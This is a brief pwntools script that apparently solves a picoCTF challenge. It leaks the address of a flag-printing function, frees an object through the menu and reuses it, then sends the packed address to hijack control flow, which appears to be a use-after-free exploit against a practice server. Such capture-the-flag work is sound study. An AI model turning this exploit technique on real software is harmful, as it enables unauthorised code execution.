from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 63017
r = remote(HOST, PORT)

r.sendlineafter('(e)xit\n', 'S')
r.recvuntil('...')
print_flag = int(r.recvline().decode().strip(), 16)
r.sendlineafter('(e)xit\n', 'I')
r.sendline('Y')
r.sendlineafter('(e)xit\n', 'L')
r.sendlineafter('anyways:\n', p32(print_flag))
r.interactive()